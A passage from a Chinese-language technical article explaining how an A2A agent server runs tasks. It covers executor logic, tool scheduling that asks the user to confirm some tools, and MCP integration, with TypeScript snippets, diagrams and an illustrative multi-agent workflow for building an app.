<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/a2a-server/src/agent/executor.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoderAgentExecutor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AgentExecutor</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">requestContext: RequestContext, eventBus: ExecutionEventBus</span>) {
    <span class="hljs-keyword">const</span> { userMessage, task } = requestContext;

    <span class="hljs-comment">// 1. 获取或创建任务</span>
    <span class="hljs-keyword">let</span> wrapper = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tasks</span>.<span class="hljs-title function_">get</span>(taskId) || <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createTask</span>(taskId);

    <span class="hljs-comment">// 2. 设置状态为 working</span>
    wrapper.<span class="hljs-property">task</span>.<span class="hljs-title function_">setTaskState</span>(<span class="hljs-string">'working'</span>);
    eventBus.<span class="hljs-title function_">publish</span>({
      <span class="hljs-attr">kind</span>: <span class="hljs-string">'status-update'</span>,
      taskId,
      <span class="hljs-attr">status</span>: { <span class="hljs-attr">state</span>: <span class="hljs-string">'working'</span> },
      <span class="hljs-attr">final</span>: <span class="hljs-literal">false</span>
    });

    <span class="hljs-comment">// 3. 调用 LLM</span>
    <span class="hljs-keyword">const</span> agentEvents = wrapper.<span class="hljs-property">task</span>.<span class="hljs-property">geminiClient</span>.<span class="hljs-title function_">sendMessageStream</span>(
      userMessage.<span class="hljs-property">parts</span>,
      abortSignal
    );

    <span class="hljs-comment">// 4. 处理 Agent 响应</span>
    <span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> event <span class="hljs-keyword">of</span> agentEvents) {
      <span class="hljs-keyword">if</span> (event.<span class="hljs-property">type</span> === <span class="hljs-string">'tool_call_request'</span>) {
        <span class="hljs-comment">// 调度工具执行</span>
        <span class="hljs-keyword">await</span> wrapper.<span class="hljs-property">task</span>.<span class="hljs-title function_">scheduleToolCalls</span>(event.<span class="hljs-property">toolCalls</span>);
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (event.<span class="hljs-property">type</span> === <span class="hljs-string">'content'</span>) {
        <span class="hljs-comment">// 发布文本内容</span>
        eventBus.<span class="hljs-title function_">publish</span>({
          <span class="hljs-attr">kind</span>: <span class="hljs-string">'status-update'</span>,
          <span class="hljs-attr">status</span>: {
            <span class="hljs-attr">state</span>: <span class="hljs-string">'working'</span>,
            <span class="hljs-attr">message</span>: { <span class="hljs-attr">parts</span>: [{ <span class="hljs-attr">kind</span>: <span class="hljs-string">'text'</span>, <span class="hljs-attr">text</span>: event.<span class="hljs-property">content</span> }] }
          }
        });
      }
    }

    <span class="hljs-comment">// 5. 等待工具执行完成</span>
    <span class="hljs-keyword">await</span> wrapper.<span class="hljs-property">task</span>.<span class="hljs-title function_">waitForPendingTools</span>();

    <span class="hljs-comment">// 6. 设置状态为 input-required</span>
    wrapper.<span class="hljs-property">task</span>.<span class="hljs-title function_">setTaskState</span>(<span class="hljs-string">'input-required'</span>);
    eventBus.<span class="hljs-title function_">publish</span>({
      <span class="hljs-attr">kind</span>: <span class="hljs-string">'status-update'</span>,
      <span class="hljs-attr">status</span>: { <span class="hljs-attr">state</span>: <span class="hljs-string">'input-required'</span> },
      <span class="hljs-attr">final</span>: <span class="hljs-literal">true</span>
    });
  }
}
</code></pre>
<p><strong>执行器的核心职责</strong>:</p>
<ol>
<li>📝 <strong>任务生命周期管理</strong>：从 submitted 到终态的完整流程控制</li>
<li>🔄 <strong>流式响应处理</strong>：实时处理 LLM 的 streaming output</li>
<li>🛠️ <strong>工具调度编排</strong>：管理并发的工具调用请求</li>
<li>📡 <strong>事件发布</strong>：将所有状态变化通过 EventBus 广播</li>
<li>💾 <strong>状态持久化</strong>：支持任务暂停和恢复</li>
</ol>
<h5 data-id="heading-40"><strong>5. Tool Scheduling - 工具调度机制</strong></h5>
<p>A2A 的工具调度是其核心能力之一，支持：</p>
<ul>
<li>⚡ <strong>并发执行</strong>：多个工具可以并行调用</li>
<li>🔄 <strong>依赖管理</strong>：自动处理工具间的依赖关系</li>
<li>⏸️ <strong>暂停/恢复</strong>：可以中断工具执行并稍后恢复</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/a2a-server/src/agent/task.ts</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span> {
  <span class="hljs-keyword">private</span> pendingTools = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">ToolExecution</span>&gt;();
  <span class="hljs-keyword">private</span> <span class="hljs-attr">toolQueue</span>: <span class="hljs-title class_">ToolCall</span>[] = [];

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">scheduleToolCalls</span>(<span class="hljs-params">toolCalls: ToolCall[]</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> toolCall <span class="hljs-keyword">of</span> toolCalls) {
      <span class="hljs-keyword">const</span> <span class="hljs-attr">execution</span>: <span class="hljs-title class_">ToolExecution</span> = {
        <span class="hljs-attr">id</span>: toolCall.<span class="hljs-property">id</span>,
        <span class="hljs-attr">toolName</span>: toolCall.<span class="hljs-property">name</span>,
        <span class="hljs-attr">args</span>: toolCall.<span class="hljs-property">arguments</span>,
        <span class="hljs-attr">status</span>: <span class="hljs-string">'pending'</span>,
        <span class="hljs-attr">startTime</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">endTime</span>: <span class="hljs-literal">null</span>,
        <span class="hljs-attr">result</span>: <span class="hljs-literal">null</span>
      };

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">pendingTools</span>.<span class="hljs-title function_">set</span>(toolCall.<span class="hljs-property">id</span>, execution);

      <span class="hljs-comment">// 检查是否需要用户确认</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">shouldConfirmTool</span>(toolCall.<span class="hljs-property">name</span>)) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventBus</span>.<span class="hljs-title function_">publish</span>({
          <span class="hljs-attr">kind</span>: <span class="hljs-title class_">CoderAgentEvent</span>.<span class="hljs-property">ToolCallConfirmationEvent</span>,
          <span class="hljs-attr">taskId</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>,
          <span class="hljs-attr">toolCall</span>: {
            <span class="hljs-attr">id</span>: toolCall.<span class="hljs-property">id</span>,
            <span class="hljs-attr">name</span>: toolCall.<span class="hljs-property">name</span>,
            <span class="hljs-attr">arguments</span>: toolCall.<span class="hljs-property">arguments</span>,
            <span class="hljs-attr">description</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getToolDescription</span>(toolCall.<span class="hljs-property">name</span>)
          }
        });
        execution.<span class="hljs-property">status</span> = <span class="hljs-string">'awaiting_confirmation'</span>;
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 自动批准，立即执行</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">executeToolCall</span>(toolCall);
      }
    }
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">executeToolCall</span>(<span class="hljs-params">toolCall: ToolCall</span>) {
    <span class="hljs-keyword">const</span> execution = <span class="hljs-variable language_">this</span>.<span class="hljs-property">pendingTools</span>.<span class="hljs-title function_">get</span>(toolCall.<span class="hljs-property">id</span>)!;
    execution.<span class="hljs-property">status</span> = <span class="hljs-string">'running'</span>;
    execution.<span class="hljs-property">startTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

    <span class="hljs-comment">// 发布开始事件</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventBus</span>.<span class="hljs-title function_">publish</span>({
      <span class="hljs-attr">kind</span>: <span class="hljs-title class_">CoderAgentEvent</span>.<span class="hljs-property">ToolCallUpdateEvent</span>,
      <span class="hljs-attr">taskId</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>,
      <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">id</span>,
      <span class="hljs-attr">status</span>: <span class="hljs-string">'running'</span>
    });

    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 调用 MCP 工具</span>
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">mcpClient</span>.<span class="hljs-title function_">callTool</span>(
        toolCall.<span class="hljs-property">name</span>,
        toolCall.<span class="hljs-property">arguments</span>
      );

      execution.<span class="hljs-property">status</span> = <span class="hljs-string">'completed'</span>;
      execution.<span class="hljs-property">result</span> = result;
      execution.<span class="hljs-property">endTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

      <span class="hljs-comment">// 发布完成事件</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventBus</span>.<span class="hljs-title function_">publish</span>({
        <span class="hljs-attr">kind</span>: <span class="hljs-title class_">CoderAgentEvent</span>.<span class="hljs-property">ToolCallUpdateEvent</span>,
        <span class="hljs-attr">taskId</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>,
        <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">id</span>,
        <span class="hljs-attr">status</span>: <span class="hljs-string">'completed'</span>,
        <span class="hljs-attr">result</span>: result,
        <span class="hljs-attr">duration</span>: execution.<span class="hljs-property">endTime</span> - execution.<span class="hljs-property">startTime</span>
      });

      <span class="hljs-comment">// 从 pending 移除</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">pendingTools</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">id</span>);

    } <span class="hljs-keyword">catch</span> (error) {
      execution.<span class="hljs-property">status</span> = <span class="hljs-string">'failed'</span>;
      execution.<span class="hljs-property">error</span> = error.<span class="hljs-property">message</span>;
      execution.<span class="hljs-property">endTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventBus</span>.<span class="hljs-title function_">publish</span>({
        <span class="hljs-attr">kind</span>: <span class="hljs-title class_">CoderAgentEvent</span>.<span class="hljs-property">ToolCallUpdateEvent</span>,
        <span class="hljs-attr">taskId</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>,
        <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">id</span>,
        <span class="hljs-attr">status</span>: <span class="hljs-string">'failed'</span>,
        <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span>
      });

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">pendingTools</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">id</span>);
    }
  }

  <span class="hljs-comment">// 等待所有待处理的工具完成</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">waitForPendingTools</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">pendingTools</span>.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, <span class="hljs-number">100</span>));
    }
  }
}
</code></pre>
<p><strong>工具调度流程图</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    LLM["LLM: I need to call tools A, B, C"] --&gt; Schedule["scheduleToolCalls([A, B, C])"]

    Schedule --&gt; ToolA["Tool A: Auto-approved"]
    Schedule --&gt; ToolB["Tool B: Needs confirmation"]
    Schedule --&gt; ToolC["Tool C: Auto-approved"]

    ToolA --&gt; ExecA["executeToolCall(A)"]
    ExecA --&gt; MCPA["MCP Server"]

    ToolB --&gt; ConfEvent["Publish ConfirmationEvent"]
    ConfEvent --&gt; WaitApproval["Wait for user approval"]
    WaitApproval --&gt; ExecB["executeToolCall(B)"]
    ExecB --&gt; MCPB["MCP Server"]

    ToolC --&gt; ExecC["executeToolCall(C)"]
    ExecC --&gt; MCPC["MCP Server"]

    MCPA --&gt; Complete["All tools completed"]
    MCPB --&gt; Complete
    MCPC --&gt; Complete

    Complete --&gt; Continue["LLM continues"]

    style LLM fill:#e1f5fe,stroke:#01579b
    style Schedule fill:#fff3e0,stroke:#e65100
    style ToolA fill:#c8e6c9,stroke:#2e7d32
    style ToolB fill:#ffcdd2,stroke:#c62828
    style ToolC fill:#c8e6c9,stroke:#2e7d32
    style Complete fill:#e1bee7,stroke:#6a1b9a
    style Continue fill:#e1f5fe,stroke:#01579b

    %% 注释：A 和 C 并发执行，B 需要等待确认
</code></pre>
<h4 data-id="heading-41">4.2 A2A 与 MCP 的深度集成</h4>
<p>A2A 并非孤立协议，它巧妙地将 MCP 整合为底层工具层，形成<strong>两层协议栈</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph Layer3["Layer 3: Agent Orchestration (A2A)"]
        A3A["Agent discovery&lt;br/&gt;(AgentCard)"]
        A3B["Task management&lt;br/&gt;(TaskState)"]
        A3C["Event streaming&lt;br/&gt;(EventBus + SSE)"]

        style Layer3 fill:#e1f5fe,stroke:#01579b,stroke-width:2px
    end

    subgraph Layer2["Layer 2: Tool Interface (MCP)"]
        A2A["Tool discovery&lt;br/&gt;(tools/list)"]
        A2B["Tool execution&lt;br/&gt;(tools/call)"]
        A2C["Resource access&lt;br/&gt;(resources/read)"]

        style Layer2 fill:#fff3e0,stroke:#e65100,stroke-width:2px
    end

    subgraph Layer1["Layer 1: Transport Layer"]
        A1A["JSON-RPC 2.0&lt;br/&gt;(for MCP)"]
        A1B["HTTP + SSE&lt;br/&gt;(for A2A)"]
        A1C["stdio / HTTP / SSE"]

        style Layer1 fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    end

    Layer3 --&gt; Layer2
    Layer2 --&gt; Layer1

    style A3A fill:#b3e5fc,stroke:#01579b
    style A3B fill:#b3e5fc,stroke:#01579b
    style A3C fill:#b3e5fc,stroke:#01579b
    style A2A fill:#ffe0b2,stroke:#e65100
    style A2B fill:#ffe0b2,stroke:#e65100
    style A2C fill:#ffe0b2,stroke:#e65100
</code></pre>
<p><strong>集成实现细节</strong>:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/a2a-server/src/agent/task.ts</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span> {
  <span class="hljs-keyword">private</span> mcpClients = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">McpClient</span>&gt;();

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">initializeMCPServers</span>(<span class="hljs-params">serverConfigs: MCPServerConfig[]</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> config <span class="hljs-keyword">of</span> serverConfigs) {
      <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">McpClient</span>(config);

      <span class="hljs-comment">// 连接到 MCP Server</span>
      <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">connect</span>();

      <span class="hljs-comment">// 获取工具列表</span>
      <span class="hljs-keyword">const</span> tools = <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">listTools</span>();

      <span class="hljs-comment">// 注册到任务的可用工具</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> tool <span class="hljs-keyword">of</span> tools) {
        <span class="hljs-keyword">const</span> qualifiedName = <span class="hljs-string">`mcp__<span class="hljs-subst">${config.name}</span>__<span class="hljs-subst">${tool.name}</span>`</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">availableTools</span>.<span class="hljs-title function_">set</span>(qualifiedName, {
          <span class="hljs-attr">originalName</span>: tool.<span class="hljs-property">name</span>,
          <span class="hljs-attr">serverName</span>: config.<span class="hljs-property">name</span>,
          <span class="hljs-attr">description</span>: tool.<span class="hljs-property">description</span>,
          <span class="hljs-attr">parameterSchema</span>: tool.<span class="hljs-property">inputSchema</span>,
          <span class="hljs-attr">mcpClient</span>: client
        });
      }

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">mcpClients</span>.<span class="hljs-title function_">set</span>(config.<span class="hljs-property">name</span>, client);
    }

    <span class="hljs-comment">// 通知 LLM 可用的工具列表（通过 Gemini Function Calling）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">geminiClient</span>.<span class="hljs-title function_">updateTools</span>(
      <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">availableTools</span>.<span class="hljs-title function_">values</span>()).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">tool</span> =&gt;</span> ({
        <span class="hljs-attr">name</span>: tool.<span class="hljs-property">originalName</span>,  <span class="hljs-comment">// Gemini 看到的是原始名称</span>
        <span class="hljs-attr">description</span>: tool.<span class="hljs-property">description</span>,
        <span class="hljs-attr">parameters</span>: tool.<span class="hljs-property">parameterSchema</span>
      }))
    );
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">callTool</span>(<span class="hljs-attr">toolName</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt; {
    <span class="hljs-comment">// 从qualified name 解析 server 和 tool</span>
    <span class="hljs-keyword">const</span> [_, serverName, originalToolName] = toolName.<span class="hljs-title function_">split</span>(<span class="hljs-string">'__'</span>);

    <span class="hljs-keyword">const</span> toolInfo = <span class="hljs-variable language_">this</span>.<span class="hljs-property">availableTools</span>.<span class="hljs-title function_">get</span>(toolName);
    <span class="hljs-keyword">if</span> (!toolInfo) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Tool <span class="hljs-subst">${toolName}</span> not found`</span>);
    }

    <span class="hljs-comment">// 调用 MCP Server</span>
    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> toolInfo.<span class="hljs-property">mcpClient</span>.<span class="hljs-title function_">callTool</span>(
      originalToolName,
      args
    );

    <span class="hljs-keyword">return</span> result;
  }
}
</code></pre>
<p><strong>工具名称转换策略</strong>:</p>






























<table><thead><tr><th>层级</th><th>工具名称</th><th>说明</th></tr></thead><tbody><tr><td><strong>MCP Server</strong></td><td><code>read_file</code></td><td>MCP 原生工具名</td></tr><tr><td><strong>A2A 内部存储</strong></td><td><code>mcp__filesystem__read_file</code></td><td>带命名空间的限定名</td></tr><tr><td><strong>Gemini LLM</strong></td><td><code>read_file</code></td><td>LLM 看到的简化名（通过 description 区分）</td></tr><tr><td><strong>用户界面</strong></td><td>"读取文件 (filesystem)"</td><td>用户友好的显示名</td></tr></tbody></table>
<h4 data-id="heading-42">4.3 A2A 实战案例：Multi-Agent 协作系统</h4>
<h5 data-id="heading-43"><strong>场景：AI 驱动的全栈应用开发</strong></h5>
<p>假设我们要开发一个包含前端、后端、数据库的完整应用。传统方式是单个 Agent 完成所有工作，但使用 A2A 可以让专业 Agent 协作：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createAgent, <span class="hljs-title class_">AgentOrchestrator</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@a2a-js/sdk'</span>;

<span class="hljs-comment">// 1. 定义专业 Agent 团队</span>
<span class="hljs-keyword">const</span> agents = {
  <span class="hljs-comment">// 前端专家</span>
  <span class="hljs-attr">frontendAgent</span>: <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Frontend Specialist'</span>,
    <span class="hljs-attr">agentUrl</span>: <span class="hljs-string">'http://localhost:8001/api'</span>,
    <span class="hljs-attr">skills</span>: [<span class="hljs-string">'react'</span>, <span class="hljs-string">'typescript'</span>, <span class="hljs-string">'css'</span>, <span class="hljs-string">'ui-design'</span>]
  }),

  <span class="hljs-comment">// 后端专家</span>
  <span class="hljs-attr">backendAgent</span>: <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Backend Specialist'</span>,
    <span class="hljs-attr">agentUrl</span>: <span class="hljs-string">'http://localhost:8002/api'</span>,
    <span class="hljs-attr">skills</span>: [<span class="hljs-string">'nodejs'</span>, <span class="hljs-string">'express'</span>, <span class="hljs-string">'api-design'</span>, <span class="hljs-string">'authentication'</span>]
  }),

  <span class="hljs-comment">// 数据库专家</span>
  <span class="hljs-attr">databaseAgent</span>: <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Database Specialist'</span>,
    <span class="hljs-attr">agentUrl</span>: <span class="hljs-string">'http://localhost:8003/api'</span>,
    <span class="hljs-attr">skills</span>: [<span class="hljs-string">'postgresql'</span>, <span class="hljs-string">'schema-design'</span>, <span class="hljs-string">'migrations'</span>, <span class="hljs-string">'optimization'</span>]
  }),

  <span class="hljs-comment">// 测试专家</span>
  <span class="hljs-attr">testAgent</span>: <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">'QA Specialist'</span>,
    <span class="hljs-attr">agentUrl</span>: <span class="hljs-string">'http://localhost:8004/api'</span>,
    <span class="hljs-attr">skills</span>: [<span class="hljs-string">'jest'</span>, <span class="hljs-string">'e2e-testing'</span>, <span class="hljs-string">'test-strategy'</span>]
  })
};

<span class="hljs-comment">// 2. 创建编排器</span>
<span class="hljs-keyword">const</span> orchestrator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentOrchestrator</span>(agents);

<span class="hljs-comment">// 3. 定义工作流</span>
<span class="hljs-keyword">const</span> workflow = orchestrator.<span class="hljs-title function_">defineWorkflow</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Build E-Commerce App'</span>,

  <span class="hljs-attr">steps</span>: [
    {
      <span class="hljs-attr">id</span>: <span class="hljs-string">'design-schema'</span>,
      <span class="hljs-attr">agent</span>: <span class="hljs-string">'databaseAgent'</span>,
      <span class="hljs-attr">task</span>: <span class="hljs-string">'设计电商应用的数据库 schema，包括用户、产品、订单表'</span>,
      <span class="hljs-attr">dependencies</span>: []
    },
    {
      <span class="hljs-attr">id</span>: <span class="hljs-string">'create-migrations'</span>,
      <span class="hljs-attr">agent</span>: <span class="hljs-string">'databaseAgent'</span>,
      <span class="hljs-attr">task</span>: <span class="hljs-string">'创建数据库迁移文件'</span>,
      <span class="hljs-attr">dependencies</span>: [<span class="hljs-string">'design-schema'</span>]
    },
    {
      <span class="hljs-attr">id</span>: <span class="hljs-string">'build-api'</span>,
      <span class="hljs-attr">agent</span>: <span class="hljs-string">'backendAgent'</span>,
      <span class="hljs-attr">task</span>: <span class="hljs-string">'基于数据库 schema 构建 REST API，包括 CRUD 和认证'</span>,
      <span class="hljs-attr">dependencies</span>: [<span class="hljs-string">'design-schema'</span>],
      <span class="hljs-attr">inputs</span>: {
        <span class="hljs-attr">schema</span>: <span class="hljs-string">'{{ steps.design-schema.result.schema }}'</span>
      }
    },
    {
      <span class="hljs-attr">id</span>: <span class="hljs-string">'build-frontend'</span>,
      <span class="hljs-attr">agent</span>: <span class="hljs-string">'frontendAgent'</span>,
      <span class="hljs-attr">task</span>: <span class="hljs-string">'构建 React 前端，连接到 API'</span>,
      <span class="hljs-attr">dependencies</span>: [<span class="hljs-string">'build-api'</span>],
      <span class="hljs-attr">inputs</span>: {
        <span class="hljs-attr">apiSpec</span>: <span class="hljs-string">'{{ steps.build-api.result.openapi }}'</span>
      }
    },
    {
      <span class="hljs-attr">id</span>: <span class="hljs-string">'write-tests'</span>,
      <span class="hljs-attr">agent</span>: <span class="hljs-string">'testAgent'</span>,
      <span class="hljs-attr">task</span>: <span class="hljs-string">'编写端到端测试'</span>,
      <span class="hljs-attr">dependencies</span>: [<span class="hljs-string">'build-frontend'</span>, <span class="hljs-string">'build-api'</span>]
    }
  ]
});

<span class="hljs-comment">// 4. 执行工作流（支持流式监控）</span>
<span class="hljs-keyword">const</span> execution = <span class="hljs-keyword">await</span> orchestrator.<span class="hljs-title function_">execute</span>(workflow);

<span class="hljs-comment">// 5. 订阅事件，实时监控进度</span>
execution.<span class="hljs-title function_">on</span>(<span class="hljs-string">'step-started'</span>, <span class="hljs-function">(<span class="hljs-params">{ stepId, agent }</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`✨ <span class="hljs-subst">${agent}</span> 开始工作: <span class="hljs-subst">${stepId}</span>`</span>);
});

execution.<span class="hljs-title function_">on</span>(<span class="hljs-string">'step-progress'</span>, <span class="hljs-function">(<span class="hljs-params">{ stepId, progress }</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`⏳ <span class="hljs-subst">${stepId}</span>: <span class="hljs-subst">${progress.message}</span>`</span>);
});

execution.<span class="hljs-title function_">on</span>(<span class="hljs-string">'step-completed'</span>, <span class="hljs-function">(<span class="hljs-params">{ stepId, result, duration }</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`✅ <span class="hljs-subst">${stepId}</span> 完成 (耗时: <span class="hljs-subst">${duration}</span>ms)`</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`   输出: <span class="hljs-subst">${result.summary}</span>`</span>);
});

execution.<span class="hljs-title function_">on</span>(<span class="hljs-string">'error'</span>, <span class="hljs-function">(<span class="hljs-params">{ stepId, error }</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`❌ <span class="hljs-subst">${stepId}</span> 失败: <span class="hljs-subst">${error.message}</span>`</span>);
});

<span class="hljs-comment">// 等待完成</span>
<span class="hljs-keyword">const</span> finalResult = <span class="hljs-keyword">await</span> execution.<span class="hljs-title function_">complete</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'🎉 全栈应用开发完成！'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`总耗时: <span class="hljs-subst">${finalResult.totalDuration}</span>ms`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`创建的文件数: <span class="hljs-subst">${finalResult.filesCreated}</span>`</span>);
</code></pre>
<p><strong>工作流执行时间线</strong>:</p>
<pre><code class="hljs language-makefile" lang="makefile">Time  Agent              Event
────  ────────────────  ──────────────────────────────────
<span class="hljs-section">00:00 DatabaseAgent     ✨ 开始设计 schema</span>
<span class="hljs-section">00:05 DatabaseAgent       ⏳ 正在分析电商领域模型...</span>
<span class="hljs-section">00:15 DatabaseAgent       ⏳ 生成用户表 schema...</span>
<span class="hljs-section">00:25 DatabaseAgent       ⏳ 生成产品表 schema...</span>
<span class="hljs-section">00:35 DatabaseAgent     ✅ Schema 设计完成</span>

<span class="hljs-section">00:35 DatabaseAgent     ✨ 开始创建迁移文件</span>
<span class="hljs-section">00:38 DatabaseAgent       ⏳ 生成 SQL migration...</span>
<span class="hljs-section">00:42 DatabaseAgent     ✅ 迁移文件创建完成</span>

<span class="hljs-section">00:42 BackendAgent      ✨ 开始构建 API</span>
<span class="hljs-section">00:45 BackendAgent        ⏳ 设置 Express server...</span>
<span class="hljs-section">00:50 BackendAgent        ⏳ 生成 CRUD endpoints...</span>
<span class="hljs-section">01:05 BackendAgent        ⏳ 实现 JWT 认证...</span>
<span class="hljs-section">01:20 BackendAgent      ✅ API 构建完成</span>

<span class="hljs-section">01:20 FrontendAgent     ✨ 开始构建前端</span>
<span class="hljs-section">01:25 FrontendAgent       ⏳ 创建 React 项目结构...</span>
<span class="hljs-section">01:35 FrontendAgent       ⏳ 生成组件代码...</span>
<span class="hljs-section">01:50 FrontendAgent       ⏳ 集成 API client...</span>
<span class="hljs-section">02:10 FrontendAgent     ✅ 前端构建完成</span>

<span class="hljs-section">02:10 TestAgent         ✨ 开始编写测试</span>
<span class="hljs-section">02:15 TestAgent           ⏳ 生成 E2E 测试场景...</span>
<span class="hljs-section">02:30 TestAgent           ⏳ 编写测试代码...</span>
<span class="hljs-section">02:45 TestAgent         ✅ 测试完成</span>

🎉 全栈应用开发完成！
<span class="hljs-section">总耗时: 165秒</span>
<span class="hljs-section">创建的文件数: 47</span>
<span class="hljs-section">测试通过率: 100%</span>
</code></pre>
<h4 data-id="heading-44">4.4 A2A 的核心优势</h4>
<p>与其他协议相比，A2A 在以下方面具有独特优势：</p>













































